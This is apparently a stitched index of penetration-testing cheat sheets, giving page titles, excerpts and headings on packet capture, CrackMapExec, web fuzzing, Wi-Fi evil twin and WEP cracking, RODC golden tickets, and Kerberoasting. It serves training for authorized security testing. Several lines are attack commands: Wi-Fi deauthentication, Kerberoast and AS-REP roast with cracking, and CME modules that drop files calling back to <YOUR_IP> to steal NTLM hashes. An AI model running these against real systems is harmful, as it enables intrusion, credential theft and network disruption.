Tcpdump Prints the tcpdump and libpcap version strings then exits. tcpdump --version Prints the help and usage information. tcpdump -h Prints a list of usable network interfaces from which tcpdump can capture. tcpdump -D Executes tcpdump and utilizes the interface specified to capture on. tcpdump -i (interface name or #) Runs a capture on the specified
headings: Network Traffic Analysis | Nomachine Connection Information | Tcpdump | Prints the tcpdump and libpcap version strings then exits. | Prints the help and usage information. | Prints a list of usable network interfaces from which tcpdump can capture. | Executes tcpdump and utilizes the interface specified to capture on. | Runs a capture on the specified interface and writes the output to a file. | TCPDump will read the output from a specified file. | tcpdump -r/-w file.pcap -l \| grep 'string' | tcpdump -i (int) host (ip) | Will filter the capture for anything sourcing from or destined to port (#) and discard the rest. | tcpdump -i (int) proto (#) | Will utilize a protocols common name to filter the traffic captured. TCP/UDP/ICMP as examples. | Tcpdump Common Switches and Filters | Will display any interfaces available to capture from. | Selects an interface to capture from. ex. -i eth0 | Do not resolve hostnames. | Do not resolve hostnames or well-known ports. | Will grab the ethernet header along with upper-layer data. | Show Contents of packets in hex and ASCII. | Same as X, but will also specify ethernet headers. (like using Xe) | Increase the verbosity of output shown and saved. | Grab a specific number of packets, then quit the program. | Defines how much of a packet to grab. | change relative sequence numbers in the capture display to absolute sequence numbers. (13248765839 instead of 101) | Print less protocol information. | Read from a file. | Write into a file | Host will filter visible traffic to show anything involving the designated host. Bi-directional | src and dest are modifiers. We can use them to designate a source or destination host or port. | net will show us any traffic sourcing from or destined to the network designated. It uses / notation. | will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples) | port is bi-directional. It will show any traffic with the specified port as the source or destination. | Portrange allows us to specify a range of ports. (0-1024) | less and greater can be used to look for a packet or protocol option of a specific size. | and && can be used to concatenate two different filters together. for example, src host AND port. | or Or allows for a match on either of two conditions. It does not have to meet both. It can be tricky. | not is a modifier saying anything but x. For example, not UDP. | TShark | Prints the help menu. | List available interfaces to capture from. | Capture on a selected interface. Replace (int) with the interface name or number. | apply a filter with (-f) looking for a specific host while utilizing tshark | Will display any interfaces available to capture from and then exit out. | Will list the Link-layer mediums you can capture from and then exit out. (ethernet as an example) | choose an interface to capture from. (-i eth0) | packet filter in libpcap syntax. Used during capture. | Grab a specific number of packets, then quit the program. Defines a stop condition. | Defines an autostop condition. It can be after a duration, specific file size, or after a certain number of packets. | Read from a file. | Write into a file using the pcapng format. | Will print the packet summary while writing into a file (-W) | will add Hex and ASCII output into the capture. | See the help menu | WireShark | Capture only traffic pertaining to a certain host | Capture traffic to or from a specific network (using slash notation to specify the mask) | Using src or dst net will only capture traffic sourcing from the specified network or destined to the target network | will filter out all traffic except the port you specify | will capture everything except the variable specified. ex. not port 80 | AND will concatenate your specified ports. ex. host 192.168.1.1 and port 80 | Portrange will grab traffic from all ports within the range only | These filters will only grab traffic from specified protocol headers. | Grabs a specific type of traffic. one to one, one to many, or one to all. | Capture only traffic pertaining to a certain host. This is an OR statement. | Capture traffic pertaining to a specific network. This is an OR statement. | Capture traffic to or from a specific host. | filter traffic by a specific protocol. There are many more options. | filter by a specific tcp port. | will capture everything except the port specified. | AND will concatenate, OR will find either of two options, NOT will exclude your input option. | Allows us to follow a tcp session in which we captured the entire stream. Replace (#) with the session to reassemble. | Will filter for any traffic matching the http protocol. | This filter will display any packet with a jpeg image file. | Filters for the ftp protocol. | Will filter for any control commands sent over ftp control channel. | Will show any objects transfered over ftp. | Misc Commands | Sudo will run the command that proceeds it with elevated privileges. | which (application) | sudo apt install (application) | Displays the manual pages for an application. ex. man tcpdump. | Common Ports and Protocols | FTP-Data | FTP-Command | SSH | Telnet | SMTP | DNS | TFTP | HTTP | Kerberos | POP3 | RPC | SFTP | NTP | Netbios-NS | Netbios-SSN | BGP | LDAP | HTTPS | SMB

title: NVIM Advanced
excerpt: NVIM Advanced Visual Block Mode (Column Editing) Critical for editing IP lists, adding prefixes/suffixes to every line. Add prefix to every line (e.g. add `http://` to a URL list) Ctrl+v → enter Visual Block gg → select to top, or G for bottom I → Insert at block start http:// → type prefix Esc → applies to all selected lines Add suffix to every line (e.g. append `:80`) Ctrl+v → Visual Block G → select all lines $ → extend selection to end of each line A → Append after each line end :80 → type s
headings: NVIM Advanced | Visual Block Mode (Column Editing) | Add prefix to every line (e.g. add `http://` to a URL list) | Add suffix to every line (e.g. append `:80`) | Delete a column / field (e.g. remove port column) | Increment numbers in a column | Macros (Repeat Complex Operations on Lists) | Record and replay a macro | Macro: Convert `ip:port` list to `http://ip:port/` | Apply macro to all lines | Macro: Extract just the IP from `IP:PORT` lines | Global Command (:g) — Batch Operations | External Commands (Shell Integration) | Pipe entire file through shell command | Insert command output into buffer | Run shell command without affecting buffer | Registers (Store IPs, Passwords, Payloads) | Regex Patterns for Pentesting | Any IPv4 address | CIDR notation | MD5 hash | SHA1 hash | SHA256 hash | Hash with salt (bcrypt/sha-crypt) | URL | Email | Port/protocol (nmap style) | Bulk IP Replacement Recipes | Change subnet across entire file | Normalize IP list (remove duplicates, sort) | Add CIDR mask to bare IPs | Strip port from `IP:PORT` list → bare IPs | Convert space-separated to newline-separated | Convert newline-separated to comma-separated (one-liner) | Extract unique subdomains from a URL list | Splits & Multi-File Workflow | Useful Settings for Pentesting Sessions

headings: rodc-attacks | What is an RODC? | Enumeration | Full Attack Chain (Garfield) | 1. RBCD on RODC$ → Admin access | 2. Pivot + psexec RODC → Extract krbtgt_XXXXX AES key | 3. Modify RODC replication policy (PowerView) | 4. Forge RODC golden ticket | 5. KeyList attack → real TGT | 6. DCSync

headings: Using CrackMapExec | Connecting to Targets | Protocol can be smb, winrm, mssql, ldap, ssh, rdp or ftp. | Target can be a DNS, an IP, a file with IPs or DNSs, or CIDR. | User can be a name, a list of names, or a file with usernames. | Password can be a plaintext password, a list of passwords, or a file with passwords. | Hash can be an NTLM hash, a list of NTLM hashes, or a file with NTLM hashes. | CME Output | The username and the password is valid. | The username or the password is invalid. | The username and password are valid, but the authentication is not successful. | We are administrators on the target machine, or we have high privileges over the target protocol. | CME Specifics Options | `--continue-on-success`</br> | --no-bruteforce | By default CME will try to authenticate to the domain controller. Can be combined with --pattern or --regex. | Get a remote file from a shared folder. | Put a local file into a remote location. | cme smb <target> -u <u> -p <p> -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL | Download all files from all shared folder. | Using Proxychains and Chisel | Method #1 - Using our attack host as the chisel server. | Method #1 - Using the target machine as the Chisel client. | Method #2 - Using the target machine as the Chisel server. | Method #2 - Using our attack host as the Chisel client. | Stealing Hashes | cme smb <target> -u <u> -p <p> -M slinky -o SERVER=<YOUR_IP> NAME=<LNK_filename | Start Responder to listen for requests. | Relay NTLMv2 to the target machine. | Search and delete the LNK file in all shares or the selected shared folder. | cme smb <target> -u <u> -p <p> -M drop-sc -o URL=\\\\<YOUR_IP>\\secret SHARE=<shared_folder> FILENAME=<filename> | Search and delete the .searchConnector-ms file in the selected shared folder. | Command Execution | Execute the CMD <command> on the target. | Execute Powershell <command> on the target. | Execute the CMD <command> on the target using WinRM protocol. | Execute the Powershell <command> on the target using WinRM protocol. | Executing remote command on the target. | Using private keys as the authentication method. | Method to execute the command. title: Web Fuzzing
excerpt: Web Fuzzing What is Web Fuzzing? Web fuzzing is a technique used to discover vulnerabilities, hidden resources, and security issues in web applications by automatically injecting a large set of input data into the application and analyzing its response. The goal is to identify unexpected behaviors or errors that could indicate potential security weaknesses or misconfigurations. Fuzzing is commonly employed in security testing to find: - Hidden directories and files - Insecure APIs and endpoints
headings: Web Fuzzing | What is Web Fuzzing? | Comparison: Brute-Forcing vs. Fuzzing | Systematically trying all possible combinations of input data to guess a specific value. | Crack passwords, keys, or other access credentials. | Exhaustive search over all possible input combinations. | Specific input or data, such as passwords or API keys. | Time-consuming due to exhaustive nature; less efficient for large input spaces. | Password crackers, key recovery tools. | Successful match of the correct input value. | Miscellaneous Commands | Add a DNS entry for a specific IP address to the /etc/hosts file. This helps resolve domain names locally. | Create a sequence wordlist from 1 to 1000. Useful for brute-forcing numerical IDs or similar patterns. | Use curl to send a POST request with specific data and headers, simulating form submissions or API calls. | Commonly Used SecLists Wordlists | /usr/share/seclists/Discovery/Web-Content/common.txt | /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | /usr/share/seclists/Discovery/Web-Content/big.txt | Tips for Using Wordlists Effectively | Select wordlists relevant to the target environment and technology stack for better results. | Use multiple wordlists together to increase the breadth of your fuzzing efforts. | Modify existing wordlists or create your own based on specific knowledge about the target. | Large wordlists can be resource-intensive; monitor performance and adjust as needed. | Utilize community-maintained wordlists for the latest and most effective fuzzing strategies. | Tools for Web Fuzzing | ffuf (Fuzz Faster U Fool) | Basic fuzzing of a URL path. | Fuzz with a specific wordlist. | Fuzz with a specific wordlist, automatically ignoring any comments in the wordlist. | Colorize the output for better readability. | Filter results by status code (e.g., 200). | Filter results by matching a regex pattern. | Add extensions to each wordlist entry. | Set the number of threads (e.g., 50) for faster fuzzing. | Use a proxy for requests. | gobuster | Directory fuzzing using a wordlist. | Fuzz with specific extensions. | Filter results by status code (e.g., 200). | Set the number of concurrent threads (e.g., 50). | Output results to a file. | Fuzz DNS subdomains using a wordlist. | Show IP addresses of discovered subdomains. | Silent mode; suppress output except for results. | wneum (Wfuzz Fork) | Basic fuzzing excluding 404 responses. | Fuzz POST data in a form. | Use a specific cookie for requests. | Add a custom header to requests. | Set the number of threads (e.g., 50) for faster fuzzing. | Fuzz using a specific HTTP method (e.g., PUT). | Filter responses by content length (e.g., 50 bytes). | feroxbuster | Basic URL fuzzing with a wordlist. | Include specified file extensions in fuzzing. | Exclude responses with status code 404. | Set the number of concurrent threads (e.g., 50). | Set maximum recursion depth (e.g., 3 levels deep). | Save output to a file. | Disable recursion into discovered directories. | Follow redirects automatically. | Tips for Effective Web Fuzzing | The quality of your wordlist can significantly impact results; choose or create wordlists relevant to the target. | Use status codes or response size filtering to focus on meaningful results and reduce noise. | Increase thread count for faster fuzzing, but be mindful of server capabilities to avoid overloading. | Pay attention to anomalies or unexpected behavior in server responses, indicating potential vulnerabilities. | Test different HTTP methods (GET, POST, PUT, DELETE) to uncover potential vulnerabilities in all endpoints. | Web APIs: REST, SOAP, and GraphQL | What is a Web API? | REST (Representational State Transfer) | Uses HTTP/HTTPS. | Typically JSON, but can also use XML, HTML, or plain text. | Each request from a client to a server must contain all the information needed. | Uses HTTP methods: GET, POST, PUT, DELETE. | Highly scalable due to its stateless nature. | Supports caching mechanisms to improve performance. | Uses endpoints that represent resources, e.g., /api/users/{id}. | Simplicity, flexibility, scalability. | Can lead to over-fetching or under-fetching data. | Ensure all CRUD operations are tested, as vulnerabilities might exist in any of them. | Fuzz input fields with unexpected data types and formats to uncover validation issues. | Analyze error messages for information disclosure or unintended behavior. | Check for improper authentication and authorization controls. | Test rate limits and throttling controls to ensure the API handles requests properly. | Leverage a variety of payloads (SQLi, XSS) to test for potential security flaws. | Test different resource representations (JSON, XML) for consistency and security flaws. | SOAP (Simple Object Access Protocol) | Protocol-independent but often used with HTTP/HTTPS. | Exclusively XML. | Can be either stateful or stateless. | Built-in security features for message integrity and confidentiality. | Uses specific error codes and messages. | More complex due to extensive standards and specifications. | Highly extensible via WS-\* standards. | Strong security, reliability, and extensibility. | More complex and less flexible compared to REST. | Use WSDL (Web Services Description Language) files to understand the service's operations and inputs. | Test XML inputs against the schema to identify validation flaws. | Fuzz XML data to test for injection vulnerabilities. | Fuzz SOAP headers to find potential security issues or misconfigurations. | Ensure security implementations are robust and correctly configured. | Verify that transport-level security (e.g., HTTPS) is enforced and properly implemented. | Analyze SOAP fault messages for potential information leakage. | GraphQL | Uses HTTP/HTTPS, typically over POST requests. | JSON-based queries and responses. | Stateless architecture. | Clients can request exactly what they need, minimizing over-fetching and under-fetching. | Typically uses a single endpoint for all operations. | Allows clients to query the API schema for available operations and data types. | Efficiency, flexibility, and powerful developer tooling. | Potential for complex queries leading to performance issues if not properly managed. | Evaluate the server's handling of deeply nested or complex queries to avoid performance bottlenecks. | Fuzz input arguments with unexpected values and data types to uncover validation flaws. | Test the server's response to aliased queries and batching for potential information leakage. | Ensure introspection is not exposing sensitive information or internal schema details. | Verify that access controls are properly enforced for different queries and operations. | Test rate limits to ensure the API can handle excessive or malicious requests appropriately. | Mutations can alter data; test for security issues and improper input validation.

title: Wi-Fi Evil Twin Attacks
excerpt: Wi-Fi Evil Twin Attacks Enumeration Set the wlan0 interface to monitor mode sudo airmon-ng start wlan0 Scan for available networks sudo airodump-ng wlan0mon Scan for available networks on channel 1, and save network traffic to a file sudo airodump-ng wlan0mon -w HTB -c 1 Deauthenticating an access point. sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon Deauthenticating a specific client from an access point. sudo aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 -c 02:00:00:00:01:00 wlan0mon

title: Wi-Fi Penetration Testing Basics
excerpt: Wi-Fi Penetration Testing Basics Set Region for the Interface. sudo iw reg set US Change the Interface Strength. `sudo ifconfig wlan0 down` `sudo iwconfig wlan0 txpower 30` `sudo ifconfig wlan0 up` Scan Available WiFi Networks. iwlist wlan0 scan | grep 'Cell\|Quality\|ESSID\|IEEE' Change the Interface Channel. `sudo ifconfig wlan0 down` `sudo iwconfig wlan0 channel 64` `sudo ifconfig wlan0 up` Change the Interface Frequency. `sudo ifconfig wlan0 down` `sudo iwconfig wlan0 freq "5.

title: Windows Attacks & Defense
excerpt: Windows Attacks & Defense Used to perform the Kerberoast attack and save output to a file. .\Rubeus.exe kerberoast /outfile:spn.txt Uses hashcat to crack Keberoastable TGS tickets. hashcat -m 13100 -a 0 spn.txt passwords.txt Uses John the Ripper to crack TGS tickets, and outputs to results.pot. sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot Asreproasting Used to perform the Asreproast attack and save the extracted tickets to a file. .\Rubeus.exe asrepr

title: Wired Equivalent Privacy (WEP) Attacks
excerpt: Wired Equivalent Privacy (WEP) Attacks ARP Request Replay Attack Enable monitor mode. sudo airmon-ng start wlan0 Configure wireless interfaces / confirm monitor mode is enabled. iwconfig Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file. sudo airodump-ng wlan0mon -c 1 -w WEP Launch ARP Request Replay attack. sudo aireplay-ng -3 -b <AP_MAC> -h <Station_MAC> wlan0mon Crack the WEP key using the PTW statistical attack. sudo aircrack-ng
headings: Wired Equivalent Privacy (WEP) Attacks | ARP Request Replay Attack | Enable monitor mode. | Configure wireless interfaces / confirm monitor mode is enabled. | Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file. | Launch ARP Request Replay attack. | Crack the WEP key using the PTW statistical attack. | Fragmentation Attack | Enable monitor mode. | Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file. | Initiate the fragmentation attak | Identify the source and destination IP addresses | Forge an ARP request using the captured PRGA (.xor) bytes. | Inject the forged packet using interactive packet replay. | Launch ARP Request Replay attack (to accelerate IV generation.) | Crack the WEP key using the PTW statistical attack. | Korek Chop Chop Attack | Start the Korek Chop Chop attack. | Identify the source and destination IP addresses. | Forge an ARP request using the captured PRGA (.xor) bytes. | Inject the forged packet using interactive packet replay. | Launch ARP Request Replay attack (to accelerate IV generation.) | Crack the WEP key using the PTW statistical attack. | The Cafe Latte Attack | Start the Cafe Latte attack. | Launch fake access point. Our rogue AP should have identical ESSID/BSSID as the target AP. | De-authenticate a connected station. | Crack the WEP key using the PTW statistical attack. | Additional WEP Cracking | Benchmark CPU performance. | Capture only initialization vectors. | Crack the WEP key using the Korek method. | Decrypt a WEP-encrypted capture file.
